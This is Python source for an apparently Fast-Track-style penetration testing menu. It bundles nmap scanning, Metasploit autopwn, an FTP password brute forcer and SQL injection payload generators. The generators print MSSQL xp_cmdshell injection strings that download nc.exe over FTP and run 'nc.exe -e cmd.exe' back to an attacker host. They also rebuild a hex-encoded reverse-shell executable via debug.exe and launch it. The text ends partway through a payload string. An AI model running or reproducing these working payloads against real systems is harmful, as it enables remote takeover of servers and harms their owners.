#!/usr/bin/env python
import os,time,re
try:
   import psyco
   psyco.full()
except ImportError:
   pass
definepath=os.getcwd()

# define metasploit path
meta_path=file("%s/config/fasttrack_config" % (definepath),"r").readlines()
for line in meta_path:
    line=line.rstrip()
    match=re.search("METASPLOIT_PATH",line)
    if match:
       line=line.replace("METASPLOIT_PATH=","")
       metapath=line

while 1==1:
          menu = raw_input("""
External Pentesting Menu:

       1. Port Scanning
       2. Launch Manual MSFConsole
       3. Autopwn Metasploit Automated
       4. FTP Brute Forcer
       5. Auto SQL Injector
       6. Binary to Hex Payload Generator
       7. Fast-Track Mass Client-Side Attack
       8. Return to Previous Menu
       
       Enter a number: """)
 
          if menu == '1' :
            print """
            FYI, this uses default scan options nmap -sT -A -v -P0 ip 
            if your going against an IDS/IPS, I wouldn't use this.

            Example usage: 192.168.1.1-254 or 192.168.1.0-255.254

            """
            nmap1=raw_input("Enter the IP address you want to go after: ")
            print "Scanning systems...be patient...."
            nmap2=os.system("nmap -sT -A -v -P0 %s > portscan.txt" % (nmap1))
            print "*** Results will be printed in under portscan.txt ***"
            nmap4=os.system("kwrite portscan.txt 2> /dev/null &")
            print 'Done.'
  
# Start Metasploit choices

          if menu == '2' :
             metasploitchoice1=raw_input("""What do you want to launch, the MSF console or MSFWeb Interfaces?

Enter 1 for console 2 for web: """)
             if metasploitchoice1 == '1':
                print 'Launching MSFConsole'
                metaconsole1=os.system("%s/msfconsole" % (metapath))
             if metasploitchoice1 == '2':
                print 'Running Metasploit Web in the background, connect to port localhost:55555 in Mozilla to access..' 
                metaconsole1=os.system("%s/msfweb &" % (metapath))

#Start Autopwn Automation

          if menu == '3':
             while 1==1 :
              menu1=raw_input("""\n\nChoose which option you would like to do:\n\n1. Run Metasploit Autopwn\n2. Update Metasploit\n3. Return to previous menu.\n\nChoose a number: """)
              if menu1=='3':
                 print "Returning to previous menu..."
                 time.sleep(1)
                 break
              if menu1=='1':
                    import sys
                    definepath=os.getcwd()
                    sys.path.append("%s/bin/ftsrc/" % (definepath))
                    try: reload(autopwn)
                    except Exception: pass
                    import autopwn
              if menu1=='2':
                 print "Updating Metasploit..."
                 updatesmetasploit=os.system("svn update %s" % (metapath))
                 print "Metasploit updated. Returning to menu..."
                  
		   
# start option 4 menu
          if menu == '4' :
             print "\n\nHere's a simple FTP brute forcer..It's a little slow, but works.\n\n"
             import ftplib,pexpect,threading, thread
             from ftplib import FTP
             try:
                ftp1=raw_input("Enter the ip address to target: ")
                ftp2=raw_input("Enter username to brute force: ")
                ftp3=raw_input("Enter path to wordlist example /root/wordlist.txt: ")
                def ftp4():
                   ftpconn=FTP('%s' % ftp1, 'anonymous', 'anonymous@anonymous.com')
                def ftp5():
                   ftpconn=FTP('%s' % ftp1, '%s' % ftp2, '%s' % line2)
             except Exception: 
                print 'Error...Did you install PExpect???'
             try:
                 print '\n\nTrying anonymous access first...'
                 ftp4()
                 print "Anonymous login successful!!!" 
                 print 'Logging in...'
                 child=pexpect.spawn('bin/sh')
                 child.sendline('ftp %s' % (ftp))
                 time.sleep(1)
                 child.sendline('anonymous')
                 time.sleep(5)
                 child.sendline('anonymous@anonymous.com')
                 child.interact()
             except (ftplib.all_errors):
                 print "Anonymous didn't work...moving on\n"
                 try:
                     for line in open ('%s' % (ftp3)) :
                        line2 = line[:-1]
                        try:
                            print 'Attempting brute force with password of %s' % line2
                            ftp5()
                            print 'Successfully brute forced account with password of %s' % line2
                            print 'Successful FTP with username of %s with password of %s' % (ftp2,line2)
                            print 'Logging in...'
                            child = pexpect.spawn('/bin/sh')
                            child.sendline ('ftp %s' % (ftp1)) 
                            time.sleep(1)
                            child.sendline ('%s' % (ftp2))
                            time.sleep(6)
                            child.sendline ('%s' % (line2))
                            child.interact()
                        except (ftplib.all_errors):
                            print 'Incorrect login..'
                 except Exception:
                     print 'Something went wrong...Did you install PExpect??'

#End FTP Brute

#Start SQL Injector

          if menu == '5' :

             sqlmenu=raw_input("""

Fast-Track SQL Injector

There's four options you can use in this menu. One and the easiest
is the binary payload. This injects a binary payload through SQL 
Injection and gives you a reverse shell. Requires nothing to be
downloaded on the attackers machine, and is relatively quick. The
second is the SQL Injector using FTP, Fast-Track will setup an FTP
server for you, and reverse a netcat off of the affected system.
The third step allows you to manually setup each connection
if you need to customize the connection for any reason. The
fourth menu generates the string used in the attack. If the
parameter you need to inject in is within the source and not
in the URL bar, you can use this to paste into something like
BURP.

  1. SQL Injector Binary Payload Auto
  2. SQL Injector Using ProFTPD  Auto
  3. SQL Injector Manual Setup
  4. SQL Injector Binary Payload Auto Form Attack
  5. SQL String Generator
  6. Return to previous menu

  Enter your choice: """)

             if sqlmenu == '1':
                    import sys
                    definepath=os.getcwd()
                    sys.path.append("%s/bin/ftsrc/" % (definepath))
                    try: reload(sqlbinarypayload)
                    except Exception: pass
                    import sqlbinarypayload              
                   

# END SQL Injection Binary Payload Auto

# Start SQL Injection FTP Auto
 
             if sqlmenu == '2':
                    import sys
                    definepath=os.getcwd()
                    sys.path.append("%s/bin/ftsrc/" % (definepath))
                    try: reload(sqlftppayload)
                    except Exception: pass
                    import sqlftppayload            
        
# END SQL Injection FTP

# Start Manual Setup Menu

             if sqlmenu == '3':
                    import sys
                    definepath=os.getcwd()
                    sys.path.append("%s/bin/ftsrc/" % (definepath))
                    try: reload(sqlmanual)
                    except Exception: pass
                    import sqlmanual     

# END Manual SQL Injection Binary Payload

# Start Auto SQL Injector Reverse RDP Over SSH

# Start String Generator

             if sqlmenu == '4':
                    import sys
                    definepath=os.getcwd()
                    sys.path.append("%s/bin/ftsrc/" % (definepath))
                    try: reload(sqlbinarypayloadpost)
                    except Exception: pass
                    import sqlbinarypayloadpost


             if sqlmenu == '5':

                print """

This portion allows you to generate each string used in each of the automated attacks. This
allows you to customize on how you want... Sometimes the parameter isn't in the url and is
within a specific form and need to use tools like BURP in order to paste into a specific
session.
               """

                sqlquestion1=raw_input("""
Enter the URL of the susceptible site, remember to put 'INJECTHERE for the injectible parameter

Example: http://www.thisisafakesite.com/blah.aspx?id='INJECTHERE&password=blah

Enter here: """)
                mainques=raw_input("""\n
Do you want to use ftp to transfer the file on the victim or use binary payload generator?

 1. FTP Generator
 2. Binary Payload Generator

 Enter choice: """)

# Start manual inject FTP generator

                if  mainques== '1':
                   sqlquestion2=raw_input("Enter the IP Address of your FTP Server: ")
                   sqlquestion3=raw_input("Enter the Username for your FTP Server: ")
                   sqlquestion4=raw_input("Enter the Password for your FTP Server: ")
                   sqlquestion5=raw_input("Enter the IP Address where you have netcat listening: ")
                   sqlquestion6=raw_input("Enter the port you have netcat running on: ")             
                   string1=(r"""';exec master..sp_addextendedproc "xp_cmdshell", "C:\Program Files\Microsoft SQL Server\MSSQL\Binn\xplog70.dll";exec master..sp_configure "show advanced options", 1;RECONFIGURE;exec master..sp_configure "xp_cmdshell", 1;RECONFIGURE;exec master..xp_cmdshell 'echo open %s> moo.txt';exec master..xp_cmdshell 'echo failedlogin1>> moo.txt' ;exec master..xp_cmdshell 'echo failedlogin2>> moo.txt';exec master..xp_cmdshell 'echo user>> moo.txt';exec master..xp_cmdshell 'echo %s>> moo.txt';exec master..xp_cmdshell 'echo %s>> moo.txt';exec master..xp_cmdshell 'echo bin>> moo.txt';exec master..xp_cmdshell 'echo get nc.exe>> moo.txt';exec master..xp_cmdshell 'echo bye>> moo.txt';exec master..xp_cmdshell 'ftp -s:moo.txt';exec master..xp_cmdshell 'del moo.txt';exec master..xp_cmdshell 'nc.exe %s %s -e cmd.exe'--""" % (sqlquestion2,sqlquestion3,sqlquestion4,sqlquestion5,sqlquestion6))
                   sqlreplace = sqlquestion1.replace("'INJECTHERE", """%s""" % (string1))
                   print "\n\n"
                   print "Generating string...Copy and paste this in your URL bar\n"
                   time.sleep(2)
                   print sqlreplace
                   print "\nString generated...\n"
                   pause=raw_input("\nPress enter to return to main menu.\n")


# End manual inject FTP generator 

# Start SQL Injector Binary Payload Generator

                if mainques== '2':                
                   print """

This section generates the necessary strings in order to do a reverse binary payload.
It has 25 strings it has to insert due to the size of the payload, but is generally
much easier than having to rely off of FTP.

                   """
                   import socket, pexpect
                   ipaddr=socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                   sqlquestion2=raw_input("Enter the IP Address for your netcat or reverse shell server: ")
                   sqlquestion3=raw_input("Enter the port number you want: ")
                   #
                   # Had to break up into multiple different requests due to the size of the payload and URL request
                   #
                   # Binary2Hex code used from IllWill, very nice small reverse payload.
                   #   
                   # While this may look a little ugly from a cleanliness perspective, theres a weird bug echoing files through SQL. When using >> it doubles whatever
                   # the command you are entering, for example if you wanted ot echo blah, it would echo blah blah into the file, which caused a major issue when
                   # getting the debug format right.
                   #
                   # So I got around the above problem by echoing individual text files and then typing them into one large one. This ended up working (phew).
                   # 
                   # I ran the binary through olly as well as process explorer and filemon. It only makes one call out when executed and thats to the destiation thats
                   # specified. Safe executable. 
                   #
                   # Re-Enable XP_Cmdshell stored procedure just in case its disabled
                   string1=(r"';exec master..xp_cmdshell 'echo n service.dll >1.txt';exec master..xp_cmdshell 'echo e 0100 >2.txt';exec master..xp_cmdshell 'echo 4d 5a 6b 65 72 6e 65 6c 33 32 2e 64 6c 6c 00 00 50 45 00 00 4c 01 02 00 00 00 00 00 00 00 00 00 00 00 00 00 e0 00 0f 01 0b 01 00 00 00 02 00 00 00 00 00 00 00 00 00 00 df 42 00 00 10 00 00 00 00 10 00 00 00 00 40 00 00 10 00 00 00 02 00 00 04 00 00 00 00 00 00 00 04 00 00 00 00 00 00 00 00 50 00 00 00 02 00 00 00 00 00 00 02 00 00 00 00 00 10 00 00 10 00 00 00 00 10 00 00 10 00 00  >3.txt'--")
                   string2=(r"';exec master..xp_cmdshell 'echo e 0180>4.txt'--") 
                   string3=(r"';exec master..xp_cmdshell 'echo 00 00 00 00 10 00 00 00 00 00 00 00 00 00 00 00 db 42 00 00 14 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  >5.txt'--") 
                   string4=(r"';exec master..xp_cmdshell 'echo e 0200 >6.txt'--") 
                   string5=(r"';exec master..xp_cmdshell 'echo 00 00 00 00 00 00 00 00 4d 45 57 00 46 12 d2 c3 00 30 00 00 00 10 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 e0 00 00 c0 02 d2 75 db 8a 16 eb d4 00 10 00 00 00 40 00 00 ef 02 00 00 00 02 00 00 00 00 00 00 00 00 00 00 00 00 00 00 e0 00 00 c0 be 1c 40 40 00 8b de ad ad 50 ad 97 b2 80 a4 b6 80 ff 13 73 f9 33 c9 ff 13 73 16 33 c0 ff 13 73 21 b6 80 41 b0 10 ff 13  >7.txt'--")
                   string6=(r"';exec master..xp_cmdshell 'echo e 0280 >8.txt'--") 
                   string7=(r"';exec master..xp_cmdshell 'echo 12 c0 73 fa 75 3e aa eb e0 e8 72 3e 00 00 02 f6 83 d9 01 75 0e ff 53 fc eb 26 ac d1 e8 74 2f 13 c9 eb 1a 91 48 c1 e0 08 ac ff 53 fc 3d 00 7d 00 00 73 0a 80 fc 05 73 06 83 f8 7f 77 02 41 41 95 8b c5 b6 00 56 8b f7 2b f0 f3 a4 5e eb 9b ad 85 c0 75 90 ad 96 ad 97 56 ac 3c 00 75 fb ff 53 f0 95 56 ad 0f c8 40 59 74 ec 79 07 ac 3c 00 75 fb 91 40 50 55 ff 53 f4 ab 75 e7 c3 00 00 00 00 00  >9.txt'--")
                   string8=(r"';exec master..xp_cmdshell 'echo e 0300 >10.txt'--") 
                   string9=(r"';exec master..xp_cmdshell 'echo 33 c9 41 ff 13 13 c9 ff 13 72 f8 c3 b0 42 00 00 bd 42 00 00 00 00 00 00 00 40 40 00 30 01 40 00 00 10 40 00 00 10 40 00 68 1c 06 32 40 07 6a 01 e8 0e 7c 38 55 0c e8 42 02 c8 15 38 9e 6a 7e 38 ea 53 0c 7a 50 2c 16 74 41 30 fd 01 bf 55 b2 b1 33 6a 91 02 06 b2 7c 55 9a 27 a3 78 83 66 c7 05 64 7b 4f a6 38 67 bc 5d 50 66 94 3d 39 66 a3 68 7e 64 66 7e 21 7d 8b 73 0c d9 0a 6a 68 94 2d a1  >11.txt'--")
                   string10=(r"';exec master..xp_cmdshell 'echo e 0380 >12.txt'--") 
                   string11=(r"';exec master..xp_cmdshell 'echo 3a 7a 6f 48 15 ea 4c 05 11 50 64 90 10 4d 44 55 91 14 3c 40 78 6a 28 10 68 5d 28 ff 35 30 74 e8 a4 9e 51 54 55 a1 55 8d bf 6e 0e 0a 08 90 22 0b e1 51 14 e8 1f 81 4b c3 ff 25 24 20 bb 6f 2a 1c 06 43 18 21 14 bd c3 22 08 71 cc 01 55 8b ec 81 c4 7c fe ff 88 56 57 e8 60 ac dd 89 45 fc 33 1d c9 8b 75 7e 38 3c 1d 74 07 1e 22 40 f7 41 eb f4 51 d1 72 e9 00 e1 58 3b c1 74 0b 5f 5e 30 b8 03  >13.txt'--")
                   string12=(r"';exec master..xp_cmdshell 'echo e 0400 >14.txt'--") 
                   string13=(r"';exec master..xp_cmdshell 'echo b9 c9 c2 08 e1 86 49 8d bd 3c 70 e5 43 2a 09 cf 2f e0 02 b0 20 aa eb 73 f2 28 8d 85 15 39 8b f0 36 f8 33 2a 33 eb 1b 8b 03 66 32 07 ef 22 65 20 4d fe 22 11 e1 28 2d ed 94 08 83 b9 dc b7 30 4b 74 fb 3b 3a 4d 08 a8 15 59 65 1d 67 0a 4c 13 41 1d 0f 14 eb e6 aa 0d 36 07 19 87 38 f4 b0 7f c0 55 73 11 8b 7d 0c c6 17 b8 02 7f 82 a2 13 9d 68 b0 a0 58 34 33 0d 46 0d e6 d1 f7 e1 fe 58 a3 ee  >15.txt'--")
                   string14=(r"';exec master..xp_cmdshell 'echo e 0480 >16.txt';exec master..xp_cmdshell 'echo e7 44 bb 1f 16 a9 ce 11 04 de 55 01 3c d4 14 d4 0e 1b 33 c0 4e ec 87 0b 70 d2 8a 06 46 3d 3c 02 b3 12 0e f7 df 90 eb 0b 2c 30 19 8d 0c 89 06 48 83 2d 0a c0 75 f1 e8 04 11 33 51 c2 38 e2 30 83 c4 07 f4 6a f5 e8 69 09 19 49 ff bd 82 aa 20 0b d0 2a 93 75 37 f8 50 22 9d 29 86 06 fc e8 4d 2f 68 8b 24 38 e6 53 1a 0f 08 8d 50 03 21 18 83 c0 04 e3 f9 ff fe 80 02 f7 d3 23 cb 81 e1 44 80 74  >17.txt'--") 
                   string15=(r"';exec master..xp_cmdshell 'echo e7 44 bb 1f 16 a9 ce 11 04 de 55 01 3c d4 14 d4 0e 1b 33 c0 4e ec 87 0b 70 d2 8a 06 46 3d 3c 02 b3 12 0e f7 df 90 eb 0b 2c 30 19 8d 0c 89 06 48 83 2d 0a c0 75 f1 e8 04 11 33 51 c2 38 e2 30 83 c4 07 f4 6a f5 e8 69 09 19 49 ff bd 82 aa 20 0b d0 2a 93 75 37 f8 50 22 9d 29 86 06 fc e8 4d 2f 68 8b 24 38 e6 53 1a 0f 08 8d 50 03 21 18 83 c0 04 e3 f9 ff fe 80 02 f7 d3 23 cb 81 e1 44 80 74  >17.txt'--")
                   string16=(r"';exec master..xp_cmdshell 'echo e 0500 >18.txt'--")
                   string17=(r"';exec master..xp_cmdshell 'echo 7c e9 6c c1 0c 60 75 77 06 f4 10 c0 40 02 d0 e1 1b c2 51 5b 3a 47 c4 49 19 ca 0c 57 06 08 30 00 00 30 40 00 63 30 6d 64 00 66 3f 40 00 14 38 20 40 03 77 73 32 5f 33 98 2e 64 6c e3 c0 80 67 07 65 74 68 6f 73 40 62 79 6e 61 7b 6d cf 1e 63 9e 3c f7 eb ff 0e 12 57 53 41 5d cf 61 72 46 75 70 18 79 68 ca 2c 73 13 4f 26 63 6b 62 ef c1 ff b8 03 6c 95 1a 72 ca 5e 6c 4c c7 57 d3 69 74 f3 46  >19.txt'--")
                   string18=(r"';exec master..xp_cmdshell 'echo e 0580 >20.txt'--")
                   string19=(r"';exec master..xp_cmdshell 'echo a7 bc 91 47 c3 4c 43 6f 6d 88 61 6e 64 36 4c 69 44 62 7e 80 76 72 fb 9d 3a 50 b7 82 e7 73 15 41 58 21 c0 64 48 d0 43 2f 60 00 00 00 00 00 66 3f 40 00 4c 6f 61 64 4c 69 62 72 61 72 79 41 00 47 65 74 50 72 6f 63 41 64 64 72 65 73 73 00 00 00 00 00 00 00 00 00 00 00 00 00 00 0c 40 00 00 e9 74 be ff ff 00 00 00 02 00 00 00 0c 40 00 00  >21.txt'--")
                   # Convert the crazy text files into one file
                   string20=(r"';exec master..xp_cmdshell 'echo r cx >22.txt';exec master..xp_cmdshell 'echo 04ef >23.txt';exec master..xp_cmdshell 'echo w >24.txt';exec master..xp_cmdshell 'echo q >25.txt';exec master..xp_cmdshell 'type 1.txt > reverse.txt';exec master..xp_cmdshell 'type 2.txt >> reverse.txt';exec master..xp_cmdshell 'type 3.txt >> reverse.txt';exec master..xp_cmdshell 'type 4.txt >> reverse.txt';exec master..xp_cmdshell 'type 5.txt >> reverse.txt';exec master..xp_cmdshell 'type 6.txt >> reverse.txt';exec master..xp_cmdshell 'type 7.txt >> reverse.txt';exec master..xp_cmdshell 'type 8.txt >> reverse.txt';exec master..xp_cmdshell 'type 9.txt >> reverse.txt';exec master..xp_cmdshell 'type 10.txt >> reverse.txt';exec master..xp_cmdshell 'type 11.txt >> reverse.txt';exec master..xp_cmdshell 'type 12.txt >> reverse.txt';exec master..xp_cmdshell 'type 13.txt >> reverse.txt';exec master..xp_cmdshell 'type 14.txt >> reverse.txt';exec master..xp_cmdshell 'type 15.txt >> reverse.txt';exec master..xp_cmdshell 'type 16.txt >> reverse.txt';exec master..xp_cmdshell 'type 17.txt >> reverse.txt';exec master..xp_cmdshell 'type 18.txt >> reverse.txt';exec master..xp_cmdshell 'type 19.txt >> reverse.txt';exec master..xp_cmdshell 'type 20.txt >> reverse.txt';exec master..xp_cmdshell 'type 21.txt >> reverse.txt';exec master..xp_cmdshell 'type 22.txt >> reverse.txt';exec master..xp_cmdshell 'type 23.txt >> reverse.txt';exec master..xp_cmdshell 'type 24.txt >> reverse.txt';exec master..xp_cmdshell 'type 25.txt >> reverse.txt'--")
                   # Convert to an executable
                   string21=(r"';exec master..xp_cmdshell 'debug<reverse.txt';exec master..xp_cmdshell 'copy service.dll reverse.exe'--")
                   # Cleanup
                   string22=(r"';exec master ..xp_cmdshell 'del 1.txt';exec master ..xp_cmdshell 'del 2.txt';exec master ..xp_cmdshell 'del 3.txt';exec master ..xp_cmdshell 'del 4.txt';exec master ..xp_cmdshell 'del 5.txt';exec master ..xp_cmdshell 'del 6.txt';exec master ..xp_cmdshell 'del 7.txt';exec master ..xp_cmdshell 'del 8.txt';exec master ..xp_cmdshell 'del 9.txt';exec master ..xp_cmdshell 'del 10.txt';exec master ..xp_cmdshell 'del 11.txt';exec master ..xp_cmdshell 'del 12.txt';exec master ..xp_cmdshell 'del 13.txt';exec master ..xp_cmdshell 'del 14.txt'--")
                   string23=(r"';exec master ..xp_cmdshell 'del 15.txt';exec master ..xp_cmdshell 'del 16.txt';exec master ..xp_cmdshell 'del 17.txt';exec master ..xp_cmdshell 'del 18.txt';exec master ..xp_cmdshell 'del 19.txt';exec master ..xp_cmdshell 'del 20.txt';exec master ..xp_cmdshell 'del 21.txt';exec master ..xp_cmdshell 'del 22.txt';exec master ..xp_cmdshell 'del 23.txt';exec master ..xp_cmdshell 'del 24.txt';exec master ..xp_cmdshell 'del 25.txt';exec master ..xp_cmdshell 'del reverse.txt';exec master ..xp_cmdshell 'del service.dll'--")
                   # Actually execute the reverse shell
                   string24=(r"';exec master..xp_cmdshell 'reverse.exe %s 4444'--" % (ipaddr))
                   sqlreplace1 = sqlquestion1.replace("'INJECTHERE", """%s""" % (string1))
                   sqlreplace2 = sqlquestion1.replace("'INJECTHERE", """%s""" % (string2))
                   sqlreplace3 = sqlquestion1.replace("'INJECTHERE", """%s""" % (string3))
                   sqlreplace4 = sqlquestion1.replace("'INJECTHERE", """%s""" % (string4))
                   sqlreplace5 = sqlquestion1.replace("'INJECTHERE", """%s""" % (string5))
                   sqlreplace6 = sqlquestion1.replace("'INJECTHERE", """%s""" % (string6))
                   sqlreplace7 = sqlquestion1.replace("'INJECTHERE", """%s""" % (string7))
                   sqlreplace8 = sqlquestion1.replace("'INJECTHERE", """%s""" % (string8))
                   sqlreplace9 = sqlquestion1.replace("'INJECTHERE", """%s""" % (string9))
                   sqlreplace10 = sqlquestion1.replace("'INJECTHERE", """%s""" % (string10))
                   sqlreplace11 = sqlquestion1.replace("'INJECTHERE", """%s""" % (string11))
                   sqlreplace12 = sqlquestion1.replace("'INJECTHERE", """%s""" % (string12))
                   sqlreplace13 = sqlquestion1.replace("'INJECTHERE", """%s""" % (string13))
                   sqlreplace14 = sqlquestion1.replace("'INJECTHERE", """%s""" % (string14))
                   sqlreplace15 = sqlquestion1.replace("'INJECTHERE", """%s""" % (string15))
                   sqlreplace16 = sqlquestion1.replace("'INJECTHERE", """%s""" % (string16))
                   sqlreplace17 = sqlquestion1.replace("'INJECTHERE", """%s""" % (string17))
                   sqlreplace18 = sqlquestion1.replace("'INJECTHERE", """%s""" % (string18))
                   sqlreplace19 = sqlquestion1.replace("'INJECTHERE", """%s""" % (string19))
                   sqlreplace20 = sqlquestion1.replace("'INJECTHERE", """%s""" % (string20))
                   sqlreplace21 = sqlquestion1.replace("'INJECTHERE", """%s""" % (string21))
                   sqlreplace22 = sqlquestion1.replace("'INJECTHERE", """%s""" % (string22))
                   sqlreplace23 = sqlquestion1.replace("'INJECTHERE", """%s""" % (string23))
                   sqlreplace24 = sqlquestion1.replace("'INJECTHERE", """%s""" % (string24))
                   print "\n"
                   print "Generating strings..."
                   print "Copy and paste each string into the URL or tools like BURP"
                   time.sleep(2)
                   print sqlreplace1
                   print "String 1 of 24"
                   pause=raw_input("Press enter for the next string...\n")
                   print sqlreplace2
                   print "String 2 of 24"
                   pause=raw_input("Press enter for the next string...\n")
                   print sqlreplace3
                   print "String 3 of 24"
                   pause=raw_input("Press enter for the next string...\n")
                   print sqlreplace4
                   print "String 4 of 24"
                   pause=raw_input("Press enter for the next string...\n")
                   print sqlreplace5
                   print "String 5 of 24"
                   pause=raw_input("Press enter for the next string...\n")
                   print sqlreplace6
                   print "String 6 of 24"
                   pause=raw_input("Press enter for the next string...\n")
                   print sqlreplace7
                   print "String 7 of 24"
                   pause=raw_input("Press enter for the next string...\n")
                   print sqlreplace8
                   print "String 8 of 24"
                   pause=raw_input("Press enter for the next string...\n")
                   print sqlreplace9
                   print "String 9 of 24"
                   pause=raw_input("Press enter for the next string...\n")
                   print sqlreplace10
                   print "String 10 of 24"
                   pause=raw_input("Press enter for the next string...\n")
                   print sqlreplace11
                   print "String 11 of 24"
                   pause=raw_input("Press enter for the next string...\n")
                   print sqlreplace12
                   print "String 12 of 24"
                   pause=raw_input("Press enter for the next string...\n")
                   print sqlreplace13
                   print "String 13 of 24"
                   pause=raw_input("Press enter for the next string...\n")
                   print sqlreplace14
                   print "String 14 of 24"
                   pause=raw_input("Press enter for the next string...\n")
                   print sqlreplace15
                   print "String 15 of 24"
                   pause=raw_input("Press enter for the next string...\n")
                   print sqlreplace16
                   print "String 16 of 24"
                   pause=raw_input("Press enter for the next string...\n")
                   print sqlreplace17
                   print "String 17 of 24"
                   pause=raw_input("Press enter for the next string...\n")
                   print sqlreplace18
                   print "String 18 of 24"
                   pause=raw_input("Press enter for the next string...\n")
                   print sqlreplace19
                   print "String 19 of 24"
                   pause=raw_input("Press enter for the next string...\n")
                   print sqlreplace20
                   print "String 20 of 24"
                   pause=raw_input("Press enter for the next string...\n")
                   print sqlreplace21
                   print "String 21 of 24"
                   pause=raw_input("Press enter for the next string...\n")
                   print sqlreplace22
                   print "String 22 of 24"
                   pause=raw_input("Press enter for the next string...\n")
                   print sqlreplace23
                   print "String 23 of 24"
                   pause=raw_input("Press enter for the next string...\n")
                   print sqlreplace24
                   print "String 24 of 24 completed"
                   pause=raw_input("Done. Press enter to return to the main menu...")

# Return to previous menu

             if sqlmenu == '6':
              print """\n\n       ***** Returning to Previous Menu *****\n"""
                               
# END Manual SQL Injection Binary Payload Generator

# Start Binary to Hex Payload Generator

          if menu == '6' :
             choice1=raw_input("""
This generates the needed information for copy and pasting
into a windows shell you already have and creating an
executable. This uses debug to create an executable so you
don't need to remotely transfer files off the system...

Do you want to use your own binary or use reverse.exe?

Reverse.exe is used from IllWill (special thanks) and
is a simple SMALL reverse shell. Simply type:
reverse.exe <ip> <port> to get a reverse shell.

1. Use reverse.exe and generate
2. Use My own

Enter choice: """)
             if choice1 == '1':
                try:
                   binary1=open("reversebinarygen.txt", "w")
                   binary1.write("""******* COPY AND PASTE BELOW INTO A WINDOWS SHELL *******\n\n\necho off && echo n 1.dll >reverse.hex\necho e 0100 >>reverse.hex && echo 4d 5a 6b 65 72 6e 65 6c 33 32 2e 64 6c 6c 00 00 50 45 00 00 4c 01 02 00 00 00 00 00 00 00 00 00 00 00 00 00 e0 00 0f 01 0b 01 00 00 00 02 00 00 00 00 00 00 00 00 00 00 df 42 00 00 10 00 00 00 00 10 00 00 00 00 40 00 00 10 00 00 00 02 00 00 04 00 00 00 00 00 00 00 04 00 00 00 00 00 00 00 00 50 00 00 00 02 00 00 00 00 00 00 02 00 00 00 00 00 10 00 00 10 00 00 00 00 10 00 00 10 00 00  >>reverse.hex\necho e 0180 >>reverse.hex && echo 00 00 00 00 10 00 00 00 00 00 00 00 00 00 00 00 db 42 00 00 14 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  >>reverse.hex\necho e 0200 >>reverse.hex && echo 00 00 00 00 00 00 00 00 4d 45 57 00 46 12 d2 c3 00 30 00 00 00 10 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 e0 00 00 c0 02 d2 75 db 8a 16 eb d4 00 10 00 00 00 40 00 00 ef 02 00 00 00 02 00 00 00 00 00 00 00 00 00 00 00 00 00 00 e0 00 00 c0 be 1c 40 40 00 8b de ad ad 50 ad 97 b2 80 a4 b6 80 ff 13 73 f9 33 c9 ff 13 73 16 33 c0 ff 13 73 21 b6 80 41 b0 10 ff 13  >>reverse.hex\necho e 0280 >>reverse.hex && echo 12 c0 73 fa 75 3e aa eb e0 e8 72 3e 00 00 02 f6 83 d9 01 75 0e ff 53 fc eb 26 ac d1 e8 74 2f 13 c9 eb 1a 91 48 c1 e0 08 ac ff 53 fc 3d 00 7d 00 00 73 0a 80 fc 05 73 06 83 f8 7f 77 02 41 41 95 8b c5 b6 00 56 8b f7 2b f0 f3 a4 5e eb 9b ad 85 c0 75 90 ad 96 ad 97 56 ac 3c 00 75 fb ff 53 f0 95 56 ad 0f c8 40 59 74 ec 79 07 ac 3c 00 75 fb 91 40 50 55 ff 53 f4 ab 75 e7 c3 00 00 00 00 00  >>reverse.hex\necho e 0300 >>reverse.hex && echo 33 c9 41 ff 13 13 c9 ff 13 72 f8 c3 b0 42 00 00 bd 42 00 00 00 00 00 00 00 40 40 00 30 01 40 00 00 10 40 00 00 10 40 00 68 1c 06 32 40 07 6a 01 e8 0e 7c 38 55 0c e8 42 02 c8 15 38 9e 6a 7e 38 ea 53 0c 7a 50 2c 16 74 41 30 fd 01 bf 55 b2 b1 33 6a 91 02 06 b2 7c 55 9a 27 a3 78 83 66 c7 05 64 7b 4f a6 38 67 bc 5d 50 66 94 3d 39 66 a3 68 7e 64 66 7e 21 7d 8b 73 0c d9 0a 6a 68 94 2d a1  >>reverse.hex\necho e 0380 >>reverse.hex && echo 3a 7a 6f 48 15 ea 4c 05 11 50 64 90 10 4d 44 55 91 14 3c 40 78 6a 28 10 68 5d 28 ff 35 30 74 e8 a4 9e 51 54 55 a1 55 8d bf 6e 0e 0a 08 90 22 0b e1 51 14 e8 1f 81 4b c3 ff 25 24 20 bb 6f 2a 1c 06 43 18 21 14 bd c3 22 08 71 cc 01 55 8b ec 81 c4 7c fe ff 88 56 57 e8 60 ac dd 89 45 fc 33 1d c9 8b 75 7e 38 3c 1d 74 07 1e 22 40 f7 41 eb f4 51 d1 72 e9 00 e1 58 3b c1 74 0b 5f 5e 30 b8 03  >>reverse.hex\necho e 0400 >>reverse.hex && echo b9 c9 c2 08 e1 86 49 8d bd 3c 70 e5 43 2a 09 cf 2f e0 02 b0 20 aa eb 73 f2 28 8d 85 15 39 8b f0 36 f8 33 2a 33 eb 1b 8b 03 66 32 07 ef 22 65 20 4d fe 22 11 e1 28 2d ed 94 08 83 b9 dc b7 30 4b 74 fb 3b 3a 4d 08 a8 15 59 65 1d 67 0a 4c 13 41 1d 0f 14 eb e6 aa 0d 36 07 19 87 38 f4 b0 7f c0 55 73 11 8b 7d 0c c6 17 b8 02 7f 82 a2 13 9d 68 b0 a0 58 34 33 0d 46 0d e6 d1 f7 e1 fe 58 a3 ee  >>reverse.hex\necho e 0480 >>reverse.hex && echo e7 44 bb 1f 16 a9 ce 11 04 de 55 01 